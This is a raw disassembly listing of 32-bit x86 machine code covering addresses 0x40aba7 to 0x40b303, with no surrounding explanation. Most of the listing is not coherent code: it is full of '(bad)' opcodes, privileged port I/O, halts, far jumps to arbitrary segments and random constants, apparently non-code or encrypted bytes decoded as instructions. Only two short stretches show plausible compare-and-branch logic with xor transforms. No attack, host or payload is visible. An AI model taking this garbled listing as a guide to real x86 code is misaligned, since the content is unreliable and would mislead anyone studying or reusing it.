  40aba7:	jecxz  0x40ab88
  40aba9:	or     esi,DWORD PTR [ecx-0x53]
  40abac:	out    dx,eax
  40abad:	es pop es
  40abaf:	rcr    BYTE PTR [esi+0x39],0x25
  40abb3:	xchg   ebx,eax
  40abb4:	jge    0x40ac1e
  40abb6:	xchg   edi,eax
  40abb7:	mov    ebp,0x10336da1
  40abbc:	pop    esi
  40abbd:	jo     0x40abc9
  40abbf:	jb     0x40ab94
  40abc1:	imul   ebp,eax,0x4ca4dfec
  40abc7:	cmp    edi,ebx
  40abc9:	(bad)  
  40abca:	cli    
  40abcb:	out    0xd9,al
  40abcd:	add    BYTE PTR [ecx],al
  40abcf:	xchg   edi,eax
  40abd0:	and    ebp,DWORD PTR [edx+0x25]
  40abd3:	sub    esp,DWORD PTR [esi]
  40abd5:	in     al,0x3b
  40abd7:	scas   eax,DWORD PTR es:[edi]
  40abd8:	int3   
  40abd9:	(bad)  
  40abda:	push   0x1b
  40abdc:	inc    edx
  40abdd:	in     eax,0x55
  40abdf:	fs inc eax
  40abe1:	out    0x54,eax
  40abe3:	inc    ebx
  40abe4:	and    eax,0x23bd2add
  40abe9:	fs icebp 
  40abeb:	cmp    al,0x15
  40abed:	sub    eax,0x141a88c0
  40abf2:	sbb    al,0x75
  40abf4:	push   cs
  40abf5:	mov    BYTE PTR [edx],bl
  40abf7:	push   ecx
  40abf8:	xor    al,0x81
  40abfa:	(bad)  
  40abfc:	mov    edx,0x91c94de8
  40ac01:	sub    BYTE PTR [ecx-0x7c0df662],dl
  40ac07:	fcmovne st,st(0)
  40ac09:	xchg   DWORD PTR [eax],edi
  40ac0b:	xor    al,0xaa
  40ac0d:	popa   
  40ac0e:	nop
  40ac0f:	pop    edx
  40ac10:	retf   
  40ac11:	lds    ebp,FWORD PTR [eax+0x75]
  40ac14:	inc    ecx
  40ac15:	push   cs
  40ac16:	test   esp,eax
  40ac18:	(bad)  
  40ac19:	mov    BYTE PTR ds:0x27a4e163,ah
  40ac1f:	xor    BYTE PTR [eax],dl
  40ac21:	sub    al,0xa9
  40ac23:	push   es
  40ac24:	not    BYTE PTR [eax]
  40ac26:	stos   DWORD PTR es:[edi],eax
  40ac27:	mov    eax,0x52a65489
  40ac2c:	in     eax,dx
  40ac2d:	xchg   ecx,eax
  40ac2e:	mov    esp,ecx
  40ac30:	add    al,0x56
  40ac32:	add    ah,BYTE PTR [edi+0x5e]
  40ac35:	push   esi
  40ac36:	mov    ds:0x97b68fdb,eax
  40ac3b:	cmp    BYTE PTR [edi],al
  40ac3d:	jecxz  0x40ac87
  40ac3f:	outs   dx,DWORD PTR ds:[esi]
  40ac41:	mov    ds:0x4710a255,eax
  40ac46:	xor    bl,BYTE PTR [ebx+0x7fb05f3b]
  40ac4c:	pop    ss
  40ac4d:	out    0x16,al
  40ac4f:	mov    bh,0xae
  40ac51:	mov    WORD PTR [esi+0x58bab3d],ds
  40ac57:	retf   
  40ac58:	in     al,dx
  40ac59:	dec    edx
  40ac5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac5b:	mov    al,0xaa
  40ac5d:	xchg   ebp,eax
  40ac5e:	push   cs
  40ac5f:	and    al,0x9b
  40ac61:	adc    esp,esp
  40ac63:	mov    WORD PTR [ebx-0x34],cs
  40ac66:	dec    ebp
  40ac67:	fst    QWORD PTR [edi]
  40ac69:	xor    BYTE PTR [ecx+0x4b],dl
  40ac6c:	stos   BYTE PTR es:[edi],al
  40ac6d:	hlt    
  40ac6e:	sbb    BYTE PTR [ebx],0x3
  40ac71:	pop    edi
  40ac72:	mov    edx,0x3982a854
  40ac77:	adc    al,0x47
  40ac79:	and    bl,BYTE PTR [esi+0xd]
  40ac7c:	ds stc 
  40ac7e:	int    0xd1
  40ac80:	inc    edi
  40ac81:	ins    BYTE PTR es:[edi],dx
  40ac82:	popa   
  40ac83:	xor    al,0xc
  40ac85:	mov    ebp,ss
  40ac87:	inc    ebp
  40ac88:	retf   
  40ac89:	gs out dx,al
  40ac8b:	sub    BYTE PTR [esi-0x6bc95f30],ch
  40ac91:	xchg   ecx,eax
  40ac92:	popa   
  40ac93:	stos   DWORD PTR es:[edi],eax
  40ac94:	push   0x5abcd471
  40ac99:	pop    es
  40ac9a:	cmp    eax,0xd0772d87
  40ac9f:	cwde   
  40aca0:	mov    DWORD PTR [edi],esp
  40aca2:	push   esp
  40aca3:	fwait
  40aca4:	push   ds
  40aca5:	loope  0x40ac59
  40aca7:	jmp    DWORD PTR [edi+0x55]
  40acaa:	jg     0x40acdd
  40acac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40acad:	inc    ebp
  40acae:	hlt    
  40acaf:	and    eax,0x77e23f68
  40acb4:	inc    ebx
  40acb5:	loope  0x40ad0c
  40acb7:	sub    al,0x43
  40acb9:	xchg   ecx,eax
  40acba:	push   ebx
  40acbb:	inc    edx
  40acbc:	pop    esi
  40acbd:	sbb    DWORD PTR [eax],esi
  40acbf:	jge    0x40acda
  40acc1:	fiadd  DWORD PTR [edx-0x71a9125f]
  40acc7:	mov    ebx,0x42522ab6
  40accc:	xor    bh,dh
  40acce:	cmp    eax,0xb01df9c3
  40acd3:	test   BYTE PTR [eax],cl
  40acd5:	jle    0x40accb
  40acd7:	das    
  40acd8:	ror    DWORD PTR [ecx-0x311e2d54],1
  40acde:	mov    ecx,0x8baaf9e6
  40ace3:	shr    DWORD PTR [ecx],cl
  40ace5:	xchg   esp,eax
  40ace6:	jle    0x40ac90
  40ace8:	cmp    esp,eax
  40acea:	fs pop eax
  40acec:	cmp    ebx,DWORD PTR [esi]
  40acee:	sbb    ebp,ecx
  40acf0:	fwait
  40acf1:	pop    edi
  40acf2:	jno    0x40ad4d
  40acf4:	dec    eax
  40acf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40acf6:	mov    al,0x65
  40acf8:	or     DWORD PTR [ebx-0x3d8fdfad],0x5609c2b4
  40ad02:	add    edi,DWORD PTR [eax-0x50]
  40ad05:	fnstenv [ebx-0x65]
  40ad08:	mov    bh,0xcd
  40ad0a:	add    DWORD PTR [eax-0x7],eax
  40ad0d:	fnstcw WORD PTR [ecx-0x51ecab4c]
  40ad13:	(bad)  
  40ad14:	jbe    0x40acf3
  40ad16:	lods   al,BYTE PTR ds:[esi]
  40ad17:	xchg   edx,eax
  40ad18:	pop    ds
  40ad19:	jmp    0x40ad69
  40ad1b:	imul   esp,DWORD PTR [edx],0x6c85ed05
  40ad21:	punpcklwd mm6,DWORD PTR [esi+eax*1+0x63]
  40ad26:	stos   DWORD PTR es:[edi],eax
  40ad27:	pop    ss
  40ad28:	adc    edi,DWORD PTR [ebp-0x56]
  40ad2b:	or     BYTE PTR [esi],0x94
  40ad2e:	sar    DWORD PTR [edi+ebx*1+0x2571f9df],1
  40ad35:	icebp  
  40ad36:	(bad)  
  40ad37:	cmp    DWORD PTR [ebx],ecx
  40ad39:	add    eax,ecx
  40ad3b:	mov    ecx,DWORD PTR [ebp-0x8]
  40ad3e:	mov    ecx,DWORD PTR [ecx]
  40ad40:	mov    eax,DWORD PTR [eax+ecx*1]
  40ad43:	mov    DWORD PTR [ebp-0x1c],eax
  40ad46:	mov    eax,DWORD PTR [ebp+0x8]
  40ad49:	xor    eax,esi
  40ad4b:	add    eax,edi
  40ad4d:	mov    DWORD PTR [ebp-0x20],eax
  40ad50:	mov    eax,DWORD PTR [ebp+0x8]
  40ad53:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ad56:	xor    eax,esi
  40ad58:	add    eax,edi
  40ad5a:	cmp    ecx,eax
  40ad5c:	je     0x40c082
  40ad62:	mov    eax,DWORD PTR [ebp-0x8]
  40ad65:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ad68:	add    ecx,DWORD PTR [eax]
  40ad6a:	mov    DWORD PTR [ebp-0x20],ecx
  40ad6d:	jmp    0x40b08e
  40ad72:	adc    edx,esi
  40ad74:	inc    ebx
  40ad75:	sahf   
  40ad76:	popa   
  40ad77:	scas   eax,DWORD PTR es:[edi]
  40ad78:	icebp  
  40ad79:	jno    0x40adf2
  40ad7b:	ficomp WORD PTR [edi+0x1c9391c7]
  40ad81:	daa    
  40ad82:	add    bl,dh
  40ad84:	jle    0x40ae04
  40ad86:	jp     0x40ae05
  40ad88:	jle    0x40ae08
  40ad8a:	aaa    
  40ad8b:	adc    ecx,DWORD PTR [edx]
  40ad8d:	push   es
  40ad8e:	cli    
  40ad8f:	sti    
  40ad90:	cmp    al,0x55
  40ad92:	loopne 0x40ade9
  40ad94:	add    al,0x8a
  40ad96:	int    0x35
  40ad98:	mov    dh,0x4e
  40ad9a:	mov    ah,0x52
  40ad9c:	xchg   ebx,eax
  40ad9d:	mov    ds:0xd236d86a,eax
  40ada2:	in     al,0xe0
  40ada4:	lahf   
  40ada5:	jmp    0x40ad4d
  40ada7:	shl    BYTE PTR [ebp+0x8],0x20
  40adab:	xlat   BYTE PTR ds:[ebx]
  40adac:	repz sub BYTE PTR ds:0xa600334f,ch
  40adb3:	shl    DWORD PTR [edi],cl
  40adb5:	ret    
  40adb6:	loopne 0x40ade1
  40adb8:	or     al,0x3c
  40adba:	inc    ebp
  40adbb:	inc    ecx
  40adbc:	xchg   dl,ch
  40adbe:	popf   
  40adbf:	dec    esi
  40adc0:	dec    edi
  40adc1:	out    dx,al
  40adc2:	pop    ss
  40adc3:	std    
  40adc4:	or     al,0x25
  40adc6:	lock xchg esp,eax
  40adc8:	cmp    DWORD PTR [edi+0x2278c72f],esp
  40adce:	adc    al,0xda
  40add0:	pop    edi
  40add1:	jp     0x40ad61
  40add3:	push   eax
  40add4:	mov    dh,0xcf
  40add6:	pop    es
  40add7:	idiv   al
  40add9:	sbb    DWORD PTR [edi],ebx
  40addb:	inc    eax
  40addc:	popa   
  40addd:	fcomi  st,st(3)
  40ade0:	pop    DWORD PTR [esi]
  40ade2:	fld    QWORD PTR [ecx-0x52]
  40ade5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ade6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ade7:	mov    esi,0xb32ee031
  40adec:	sbb    ebp,DWORD PTR [esi-0x110d8063]
  40adf2:	and    eax,0x6c12a2e7
  40adf7:	int    0xa1
  40adf9:	jp     0x40ae05
  40adfb:	mov    dl,0x89
  40adfd:	push   ecx
  40adfe:	pop    ss
  40adff:	mov    edi,0x2dcc5bbd
  40ae04:	inc    edx
  40ae05:	or     bl,BYTE PTR [eax-0x45]
  40ae08:	test   al,0x44
  40ae0a:	cmove  esp,DWORD PTR [eax-0x5f]
  40ae0e:	and    al,0xc5
  40ae10:	push   edx
  40ae11:	or     DWORD PTR [ebx+edi*8-0x4e653fa],edi
  40ae18:	cmp    DWORD PTR [edx-0x17b593f],0xa
  40ae1f:	xchg   ecx,eax
  40ae20:	gs pop ecx
  40ae22:	or     eax,0xffffff90
  40ae25:	in     al,0xa0
  40ae27:	mov    ch,0x98
  40ae29:	jbe    0x40ae30
  40ae2b:	fidivr DWORD PTR [ebx-0x3e]
  40ae2e:	arpl   WORD PTR [ecx],sp
  40ae30:	ins    DWORD PTR es:[edi],dx
  40ae31:	stos   DWORD PTR es:[edi],eax
  40ae32:	cmp    esp,DWORD PTR [ebp+0x5b]
  40ae35:	and    eax,0x230a76f
  40ae3a:	into   
  40ae3b:	jnp    0x40ae7f
  40ae3d:	sbb    al,0x99
  40ae3f:	test   eax,0x8b916f32
  40ae44:	ror    BYTE PTR [ebp-0xf],0xd0
  40ae48:	xchg   bh,dl
  40ae4a:	mov    esp,0x7ff849fb
  40ae4f:	push   eax
  40ae50:	sub    al,0x7c
  40ae52:	lods   eax,DWORD PTR ds:[esi]
  40ae53:	and    bh,bl
  40ae55:	adc    al,0xab
  40ae57:	and    dh,BYTE PTR [eax-0x14677bfd]
  40ae5d:	mov    ecx,0x83a94fe6
  40ae62:	push   ss
  40ae63:	mov    ch,0x2e
  40ae65:	shl    BYTE PTR [edx],0x8f
  40ae68:	jle    0x40ae57
  40ae6a:	adc    ebp,ebp
  40ae6c:	shl    bh,1
  40ae6e:	and    eax,0x3c5490dd
  40ae73:	hlt    
  40ae74:	pushf  
  40ae75:	sub    DWORD PTR [ecx+0x3f1fe455],edi
  40ae7b:	and    cl,bl
  40ae7d:	lods   eax,DWORD PTR ds:[esi]
  40ae7e:	test   al,0x20
  40ae80:	mov    dh,0x9e
  40ae82:	(bad)  
  40ae83:	lods   al,BYTE PTR ds:[esi]
  40ae84:	imul   ebx,DWORD PTR [ebp-0x3e],0xfffffff3
  40ae88:	jmp    0x6135:0xf8a82390
  40ae8f:	dec    edx
  40ae90:	ret    0x2d89
  40ae93:	je     0x40aea4
  40ae95:	dec    ebx
  40ae96:	mov    al,0x46
  40ae98:	aam    0x81
  40ae9a:	(bad)  
  40ae9b:	fdiv   DWORD PTR [ecx+0x2f]
  40ae9e:	stos   DWORD PTR es:[edi],eax
  40ae9f:	in     eax,0xf1
  40aea1:	dec    edi
  40aea2:	iret   
  40aea3:	ret    0x2d37
  40aea6:	mov    al,ds:0x2f1d0670
  40aeab:	imul   ebp,DWORD PTR [edi-0x32],0x50
  40aeaf:	push   esp
  40aeb0:	sbb    DWORD PTR [ecx-0x2e],eax
  40aeb3:	das    
  40aeb4:	scas   eax,DWORD PTR es:[edi]
  40aeb5:	xchg   edi,eax
  40aeb6:	out    0x68,eax
  40aeb8:	mov    bh,0x4b
  40aeba:	bound  edx,QWORD PTR [eax-0x3cd10f26]
  40aec0:	aas    
  40aec1:	gs std 
  40aec3:	mov    DWORD PTR ds:0xe15d874c,ebx
  40aec9:	xchg   ebp,eax
  40aeca:	adc    eax,0x3bdd2cb7
  40aecf:	push   cs
  40aed0:	pop    esi
  40aed1:	jecxz  0x40ae98
  40aed3:	mov    WORD PTR [ecx],ds
  40aed5:	adc    DWORD PTR [ebp+0x15],edi
  40aed8:	in     al,dx
  40aed9:	es push edx
  40aedb:	push   esi
  40aedc:	clc    
  40aedd:	pushf  
  40aede:	adc    al,0x32
  40aee0:	cmc    
  40aee1:	in     eax,dx
  40aee2:	xor    al,0x10
  40aee4:	and    DWORD PTR [eax],0xffffffbd
  40aee7:	cdq    
  40aee8:	and    dl,ch
  40aeea:	dec    DWORD PTR [ecx+0x6532fe4]
  40aef0:	rol    al,1
  40aef2:	lea    ebp,[eax-0x69]
  40aef5:	xchg   ecx,eax
  40aef6:	inc    esp
  40aef7:	loop   0x40af50
  40aef9:	addr16 sub al,0x45
  40aefc:	ss mov esi,0x2424b08a
  40af02:	inc    esp
  40af03:	retf   
  40af04:	das    
  40af05:	xor    ebp,0xc5aaf21c
  40af0b:	mov    eax,ds:0xa21fb1b3
  40af10:	jae    0x40af2f
  40af12:	test   DWORD PTR [ecx-0x5e],0x626d183a
  40af19:	cmp    eax,0x1623efa0
  40af1e:	xor    edx,esi
  40af20:	mov    ah,0xc9
  40af22:	or     DWORD PTR [edx],eax
  40af24:	shr    DWORD PTR [eax+0x87dba83],0x37
  40af2b:	mov    eax,ds:0x24c414af
  40af30:	mov    cl,0x90
  40af32:	jno    0x40af82
  40af34:	mov    al,ds:0xa300c06
  40af39:	push   es
  40af3a:	mov    DWORD PTR [ebx-0x7e52cd4f],edx
  40af40:	pop    eax
  40af41:	pop    es
  40af42:	aaa    
  40af43:	jmp    0xcce71f3a
  40af48:	xor    esp,DWORD PTR [edi-0x5b]
  40af4b:	mov    ds:0xa62bd866,eax
  40af50:	outs   dx,BYTE PTR ds:[esi]
  40af51:	jbe    0x40af30
  40af53:	lods   al,BYTE PTR ds:[esi]
  40af54:	mov    ah,0xad
  40af56:	ret    0x4801
  40af59:	xchg   esi,eax
  40af5a:	jmp    DWORD PTR [eax-0x6d]
  40af5d:	push   es
  40af5e:	int3   
  40af5f:	cmp    BYTE PTR [edi-0x2f],ch
  40af62:	addr16 inc ebx
  40af64:	scas   eax,DWORD PTR es:[edi]
  40af65:	inc    ebx
  40af66:	xor    DWORD PTR ds:0x8d2e5809,0xffffff90
  40af6d:	pop    edx
  40af6e:	into   
  40af6f:	dec    edi
  40af70:	jns    0x40af31
  40af72:	fisubr WORD PTR [edi+0x4d892d09]
  40af78:	maxps  xmm0,XMMWORD PTR [ebx-0x26]
  40af7c:	fadd   st,st(7)
  40af7e:	pop    esp
  40af7f:	mov    cl,0x69
  40af81:	js     0x40af70
  40af83:	adc    al,bh
  40af85:	push   eax
  40af86:	(bad)  
  40af88:	xor    BYTE PTR [esi-0x1e],al
  40af8b:	pop    ss
  40af8c:	or     dh,BYTE PTR [ecx-0x2cca06e1]
  40af92:	popf   
  40af93:	adc    eax,0xdaed37c
  40af98:	pop    es
  40af99:	out    0xe0,eax
  40af9b:	gs aam 0xf8
  40af9e:	rcl    BYTE PTR [eax-0x61],0x9b
  40afa2:	pop    es
  40afa3:	or     DWORD PTR [edi-0x6469a3d9],esp
  40afa9:	jmp    0x40afc2
  40afab:	int    0x1f
  40afad:	rcl    DWORD PTR [ebx+0x302d601e],0x94
  40afb4:	cmp    esi,DWORD PTR [ebx]
  40afb6:	mov    ah,0xc8
  40afb8:	loop   0x40af89
  40afba:	dec    edx
  40afbb:	jmp    0x18c5:0x40384b7a
  40afc2:	jecxz  0x40afb9
  40afc4:	lods   al,BYTE PTR ds:[esi]
  40afc5:	sahf   
  40afc6:	(bad)  
  40afc7:	nop
  40afc8:	aam    0x9d
  40afca:	jp     0x40af57
  40afcc:	fbstp  TBYTE PTR [ecx]
  40afce:	data16 or BYTE PTR [edi+eax*1],cl
  40afd2:	call   DWORD PTR [ebx+0x4c6253e1]
  40afd8:	or     edx,DWORD PTR [edi-0x50d8349b]
  40afde:	aam    0xf8
  40afe0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40afe1:	aam    0xcb
  40afe3:	cmp    al,0xb0
  40afe5:	stc    
  40afe6:	ror    DWORD PTR [esi+0x5ed6cc33],0xb5
  40afed:	mov    esp,0xec930b37
  40aff2:	adc    BYTE PTR [esi],bh
  40aff4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aff5:	ror    bl,1
  40aff7:	popf   
  40aff8:	or     eax,0xf145d6e3
  40affd:	(bad)  
  40affe:	adc    al,0x20
  40b000:	mov    ebx,0xa2ef2488
  40b005:	bound  esi,QWORD PTR [edi+ecx*4-0x4eec70b4]
  40b00c:	push   esi
  40b00d:	pop    ss
  40b00e:	out    0x15,al
  40b010:	pop    ebp
  40b011:	out    dx,eax
  40b012:	or     DWORD PTR [esi+0x789bdecf],0x19d46353
  40b01c:	ret    
  40b01d:	mov    eax,ds:0xe0e1fffe
  40b022:	mov    ch,0xa2
  40b024:	pop    ds
  40b025:	icebp  
  40b026:	or     eax,0x4e3f768f
  40b02b:	xor    eax,0x28a9085c
  40b030:	dec    edx
  40b031:	push   edi
  40b032:	and    al,0x8f
  40b034:	fisub  WORD PTR [edx+0xc2ba9cf]
  40b03a:	mov    al,gs:0x471ec82f
  40b040:	(bad)  
  40b041:	push   ds
  40b042:	test   DWORD PTR [edx-0x2d33ae48],eax
  40b048:	xor    BYTE PTR [eax-0x7f4d6bae],cl
  40b04e:	imul   ebp,DWORD PTR [ebp+0x79f6158a],0x77
  40b055:	and    al,bl
  40b057:	dec    esp
  40b058:	enter  0xf937,0xd6
  40b05c:	jl     0x40b02e
  40b05e:	mov    ds,WORD PTR [ebp+0x354b1685]
  40b064:	lods   al,BYTE PTR ds:[esi]
  40b065:	pop    ds
  40b066:	pop    eax
  40b067:	sbb    edi,DWORD PTR [edx+0x334233f0]
  40b06d:	dec    ebp
  40b06e:	test   BYTE PTR [ebx+0x772a1a8f],ah
  40b074:	daa    
  40b075:	addr16 dec esp
  40b077:	and    eax,0xe5507552
  40b07c:	sub    al,BYTE PTR [edx+0x1e]
  40b07f:	adc    DWORD PTR [ebx],esi
  40b081:	dec    ecx
  40b082:	mov    ds:0x7c65ea38,al
  40b087:	fdivr  DWORD PTR ds:0x4bf9e861
  40b08d:	jle    0x40b01a
  40b08f:	inc    ebp
  40b090:	loopne 0x40b01d
  40b092:	dec    ebp
  40b093:	clc    
  40b094:	mov    eax,DWORD PTR [eax+0xc]
  40b097:	mov    ecx,DWORD PTR [ecx]
  40b099:	mov    al,BYTE PTR [eax+ecx*1]
  40b09c:	add    al,0x38
  40b09e:	xor    al,0x46
  40b0a0:	cmp    al,0xc5
  40b0a2:	je     0x40b6fb
  40b0a8:	jmp    0x40b3c9
  40b0ad:	sar    DWORD PTR [ecx],1
  40b0af:	mov    cl,0xa4
  40b0b1:	mov    cl,0x74
  40b0b3:	shr    DWORD PTR [ecx+0x55],1
  40b0b6:	fsubr  DWORD PTR [eax+0x37]
  40b0b9:	out    0x58,eax
  40b0bb:	in     eax,dx
  40b0bc:	ret    
  40b0bd:	or     al,0xfe
  40b0bf:	jle    0x40b13f
  40b0c1:	jp     0x40b140
  40b0c3:	jle    0x40b143
  40b0c5:	sub    al,BYTE PTR [ebp-0x3a]
  40b0c8:	das    
  40b0c9:	cwde   
  40b0ca:	inc    BYTE PTR [edx+esi*8+0x2d32f0f2]
  40b0d1:	xchg   esi,eax
  40b0d2:	mov    bl,0x70
  40b0d4:	sahf   
  40b0d5:	jp     0x40b07a
  40b0d7:	dec    ebp
  40b0d8:	cld    
  40b0d9:	dec    edx
  40b0da:	imul   ecx,edx,0x7ac742b9
  40b0e0:	push   ecx
  40b0e1:	(bad)  
  40b0e2:	lahf   
  40b0e3:	pop    es
  40b0e4:	fist   DWORD PTR fs:[ecx]
  40b0e7:	adc    eax,0xb9cfdb7f
  40b0ec:	mov    al,ds:0xfe56f206
  40b0f1:	scas   eax,DWORD PTR es:[edi]
  40b0f2:	repz pusha 
  40b0f4:	xor    dl,ch
  40b0f6:	loop   0x40b0c3
  40b0f8:	pop    edi
  40b0f9:	push   0x7f679497
  40b0fe:	pop    eax
  40b0ff:	jmp    0xc572a58b
  40b104:	rol    DWORD PTR [ecx],cl
  40b106:	ins    DWORD PTR es:[edi],dx
  40b107:	mov    ebp,0x588f6c93
  40b10c:	sbb    dl,cl
  40b10e:	ret    
  40b10f:	jnp    0x40b0b5
  40b111:	lock sub esp,DWORD PTR [eax+0x26]
  40b115:	jp     0x40b146
  40b117:	out    dx,eax
  40b118:	pop    edx
  40b119:	push   cs
  40b11a:	shl    dl,1
  40b11c:	jno    0x40b0a0
  40b11e:	mov    bl,0xab
  40b120:	hlt    
  40b121:	mov    WORD PTR ds:0xa5f46aea,ds
  40b127:	icebp  
  40b128:	scas   al,BYTE PTR es:[edi]
  40b129:	out    0x52,eax
  40b12b:	and    ah,BYTE PTR [esi-0x31f37c7c]
  40b131:	adc    al,0x72
  40b133:	es mov ebx,0xb9f0b63e
  40b139:	fcomp  QWORD PTR [edi-0x2bb0be06]
  40b13f:	stos   DWORD PTR es:[edi],eax
  40b140:	lods   al,BYTE PTR ds:[esi]
  40b141:	arpl   WORD PTR [eax+0x43],di
  40b144:	mov    ch,0xba
  40b146:	mov    dl,0x14
  40b148:	xor    eax,0xe61baced
  40b14d:	sub    al,0xe9
  40b14f:	sub    BYTE PTR [ecx+0x27],0x90
  40b153:	or     ecx,DWORD PTR [ecx+0x17e57da0]
  40b159:	mov    eax,0x836e4379
  40b15e:	push   ss
  40b15f:	cmp    al,0xc5
  40b161:	jns    0x40b16f
  40b163:	push   es
  40b164:	inc    ebp
  40b165:	adc    DWORD PTR [edi+0xac84fa6],edi
  40b16b:	fs ins BYTE PTR es:[edi],dx
  40b16d:	xchg   esp,eax
  40b16e:	pop    edx
  40b16f:	(bad)  
  40b170:	pop    edx
  40b171:	jmp    0x40b157
  40b173:	jg     0x40b18e
  40b175:	xor    DWORD PTR [ebp+0x6a46763f],ebp
  40b17b:	mov    ds:0xbc5690cd,eax
  40b180:	xor    eax,DWORD PTR [ebx+0x5d]
  40b183:	into   
  40b184:	jecxz  0x40b131
  40b186:	shr    BYTE PTR [esi],cl
  40b188:	aaa    
  40b189:	fwait
  40b18a:	mov    WORD PTR [ebx-0x1f352600],gs
  40b190:	ja     0x40b113
  40b192:	mul    DWORD PTR [ebp+0x4e293e6a]
  40b198:	sbb    ch,cl
  40b19a:	sbb    DWORD PTR [ebp+0x19375dcf],ebx
  40b1a0:	cmp    eax,ebp
  40b1a2:	ret    0x9221
  40b1a5:	mov    ecx,0x850ecfbb
  40b1aa:	dec    edi
  40b1ab:	out    dx,eax
  40b1ac:	fldln2 
  40b1ae:	cmp    al,0x65
  40b1b0:	adc    al,0x82
  40b1b2:	xor    al,0x6
  40b1b4:	or     dl,BYTE PTR [ecx-0x3e0cf0bb]
  40b1ba:	pop    ss
  40b1bb:	add    ah,cl
  40b1bd:	dec    eax
  40b1be:	and    dl,dl
  40b1c0:	jle    0x40b16e
  40b1c2:	mov    ds:0x3f22ac99,eax
  40b1c7:	out    0x1c,al
  40b1c9:	imul   ebx,DWORD PTR [eax-0x170814b3],0xfffffffb
  40b1d0:	adc    al,0x52
  40b1d2:	sub    al,0x7b
  40b1d4:	jp     0x40b161
  40b1d6:	inc    edx
  40b1d7:	jge    0x40b18f
  40b1d9:	adc    al,0x68
  40b1db:	xchg   BYTE PTR [ebp+0x2c11dcf7],bh
  40b1e1:	cmp    al,0x5b
  40b1e3:	cdq    
  40b1e4:	dec    edx
  40b1e5:	repnz mov esp,0x7bbeeaa9
  40b1eb:	icebp  
  40b1ec:	shr    BYTE PTR ds:0x16a5f55c,1
  40b1f2:	push   esi
  40b1f3:	(bad)  
  40b1f4:	ja     0x40b23e
  40b1f6:	data16 ins BYTE PTR es:[edi],dx
  40b1f8:	xor    al,0x75
  40b1fa:	cmp    dl,dl
  40b1fc:	adc    eax,DWORD PTR [esi-0x2c]
  40b1ff:	popa   
  40b200:	mov    bh,0x38
  40b202:	mov    ebx,edi
  40b204:	call   0x1483:0xa600b513
  40b20b:	push   0xffffff85
  40b20d:	inc    ecx
  40b20e:	mov    bh,0x7e
  40b210:	jle    0x40b1a0
  40b212:	jb     0x40b1f6
  40b214:	(bad)  
  40b215:	and    eax,0xd6003555
  40b21a:	xor    eax,DWORD PTR [esp+esi*8-0x3c]
  40b21e:	les    ebx,FWORD PTR [esp+ebx*4-0x7c]
  40b222:	dec    eax
  40b223:	jno    0x40b220
  40b225:	int    0x9e
  40b227:	rol    BYTE PTR [edx+0x6b],cl
  40b22a:	rcr    BYTE PTR [ecx],0xcc
  40b22d:	sbb    ebx,DWORD PTR [ecx-0x24191f85]
  40b233:	(bad)  
  40b234:	shl    DWORD PTR [ebp+ebp*8+0x1f20a27b],cl
  40b23b:	pop    edx
  40b23c:	add    edi,DWORD PTR [edi-0xe]
  40b23f:	cmp    al,0xc5
  40b241:	mov    cl,0x25
  40b243:	(bad)  
  40b244:	push   edx
  40b245:	adc    bh,BYTE PTR [esi-0x7f4f794c]
  40b24b:	jo     0x40b217
  40b24d:	jnp    0x40b2ad
  40b24f:	imul   edi,DWORD PTR [esi+0x4a],0xdc8784a2
  40b256:	pmaxsw mm5,QWORD PTR [esi-0x54]
  40b25a:	jp     0x40b248
  40b25c:	stc    
  40b25d:	bound  esp,QWORD PTR [esi+0x33cd8641]
  40b263:	outs   dx,DWORD PTR ds:[esi]
  40b264:	push   es
  40b265:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b266:	adc    al,0xb3
  40b268:	test   al,0x46
  40b26a:	pop    edx
  40b26b:	cmp    edi,DWORD PTR [edx]
  40b26d:	out    0xc4,al
  40b26f:	jno    0x40b219
  40b271:	xor    eax,DWORD PTR [esi+0xae8aa02]
  40b277:	popf   
  40b278:	dec    DWORD PTR [eax+0x6dada598]
  40b27e:	jmp    0x3647:0x74440594
  40b285:	xchg   ebx,eax
  40b286:	push   ebx
  40b287:	or     BYTE PTR [ebx-0x79],cl
  40b28a:	inc    ecx
  40b28b:	sub    DWORD PTR [eax+0x7e],ecx
  40b28e:	xor    al,0x84
  40b290:	out    0xe2,eax
  40b292:	push   ds
  40b293:	inc    esi
  40b294:	jns    0x40b228
  40b296:	dec    eax
  40b297:	jae    0x40b297
  40b299:	add    BYTE PTR ds:0x31dc7877,al
  40b29f:	mov    cl,0x9f
  40b2a1:	lds    edi,FWORD PTR [ecx+ecx*2+0x44]
  40b2a5:	lods   al,BYTE PTR ds:[esi]
  40b2a6:	loop   0x40b271
  40b2a8:	and    eax,0x8284d6f8
  40b2ad:	cmp    esp,DWORD PTR [ebp-0x46a0457]
  40b2b3:	icebp  
  40b2b4:	sbb    al,0x50
  40b2b6:	test   al,0xb
  40b2b8:	test   BYTE PTR [ecx],bl
  40b2ba:	mul    DWORD PTR [esi+0x29129f33]
  40b2c0:	popa   
  40b2c1:	mov    bh,0x71
  40b2c3:	xchg   ecx,eax
  40b2c4:	je     0x40b32f
  40b2c6:	fiadd  DWORD PTR [ebx+0x38]
  40b2c9:	enter  0xb7d4,0x71
  40b2cd:	xor    al,BYTE PTR [edi+0x4aefc78e]
  40b2d3:	adc    eax,0xf06f6196
  40b2d8:	shl    BYTE PTR [edx-0x7b],cl
  40b2db:	outs   dx,DWORD PTR ds:[esi]
  40b2dc:	into   
  40b2dd:	dec    ebx
  40b2de:	mov    edx,0x1f40402f
  40b2e3:	cmp    ebx,edx
  40b2e5:	jno    0x40b2e4
  40b2e7:	scas   eax,DWORD PTR es:[edi]
  40b2e8:	add    eax,0x69124419
  40b2ed:	xchg   esi,eax
  40b2ee:	or     eax,0xa5504ef3
  40b2f3:	jmp    0x227afaf2
  40b2f8:	mul    ecx
  40b2fa:	aam    0x4a
  40b2fc:	inc    edi
  40b2fd:	nop
  40b2fe:	mov    ebp,0xf85b593f
  40b303:	xchg   ebp,eax
